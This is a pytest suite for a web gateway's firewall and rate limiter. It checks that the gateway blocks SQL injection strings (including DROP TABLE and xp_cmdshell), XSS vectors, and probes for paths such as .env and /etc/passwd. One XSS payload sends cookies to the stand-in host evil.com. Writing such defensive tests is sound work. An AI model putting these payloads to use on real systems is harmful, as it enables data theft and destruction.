"""Perimeter and Web Application Firewall (WAF) security test suite.

Validates:
- Perimeter ingress filtering of malicious payloads (SQLi, XSS, Path Traversal)
- Sensitive path probe detection (e.g. .env, .git, config files)
- Sliding-window rate limiting & brute-force IP throttling under attack patterns
- RFC 7807 problem details response integrity under blocked requests
"""

from __future__ import annotations

import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.presentation.routers.gateway import (
    GatewaySlidingWindowRateLimiter,
)


@pytest.fixture()
def client() -> TestClient:
    return TestClient(app)


class TestPerimeterWafFilters:
    """Tests WAF detection patterns on perimeter ingress."""

    SQLI_PATTERNS = [
        "' UNION SELECT NULL, NULL, username, password FROM users --",
        "1' OR '1'='1",
        "admin'; DROP TABLE transactions; --",
        "1; EXEC xp_cmdshell('whoami')",
    ]

    XSS_PATTERNS = [
        "<script>alert(1)</script>",
        "javascript:alert(document.cookie)",
        "<img src=x onerror=alert('xss')>",
        "<svg/onload=fetch('//evil.com/'+document.cookie)>",
    ]

    SENSITIVE_PROBE_PATHS = [
        "/.env",
        "/.git/config",
        "/wp-login.php",
        "/admin.php",
        "/actuator/env",
        "/api/v1/../../etc/passwd",
    ]

    def test_sql_injection_rejection_at_perimeter(self, client: TestClient) -> None:
        """Verify suspicious SQLi payloads in proxy routes are rejected or fail safely."""
        for pattern in self.SQLI_PATTERNS:
            response = client.get(f"/api/v1/gateway/proxy/api/v1/search?query={pattern}")
            assert response.status_code in [400, 404, 401]
            if response.status_code == 404:
                data = response.json()
                assert data["type"] == "https://cfi-platform.org/errors/NotFound"

    def test_xss_payload_handling_at_perimeter(self, client: TestClient) -> None:
        """Verify XSS vectors in proxy queries are neutralized and return valid problem details."""
        for pattern in self.XSS_PATTERNS:
            response = client.get(f"/api/v1/gateway/proxy/api/v1/echo?payload={pattern}")
            assert response.status_code in [400, 404, 401]

    def test_sensitive_path_probes_rejected(self, client: TestClient) -> None:
        """Verify probe requests targeting hidden configs or admin scripts return 404."""
        for path in self.SENSITIVE_PROBE_PATHS:
            response = client.get(f"/api/v1/gateway/proxy{path}")
            assert response.status_code in [400, 404]

    def test_burst_throttling_protects_gateway(self) -> None:
        """Verify sliding window rate limiter throttles burst floods from attacking IPs."""
        limiter = GatewaySlidingWindowRateLimiter()
        attacker_ip = "198.51.100.200"

        # Send 10 rapid requests with limit 5
        allowed_count = 0
        blocked_count = 0
        for _ in range(10):
            allowed, _, _ = limiter.check_rate_limit(attacker_ip, max_requests=5, window_seconds=60)
            if allowed:
                allowed_count += 1
            else:
                blocked_count += 1

        assert allowed_count == 5
        assert blocked_count == 5

    def test_rate_limiter_window_cleanup(self) -> None:
        """Verify stale timestamps outside the sliding window are cleanly pruned."""
        import time
        limiter = GatewaySlidingWindowRateLimiter()
        client_ip = "198.51.100.201"

        # Pre-fill window with timestamps 120 seconds in the past
        old_time = time.time() - 120
        with limiter._lock:
            limiter._requests[client_ip] = [old_time, old_time + 1, old_time + 2]

        # Check limit with 60s window: old entries must be pruned, request must be allowed
        allowed, remaining, _ = limiter.check_rate_limit(client_ip, max_requests=3, window_seconds=60)
        assert allowed is True
        assert remaining == 2
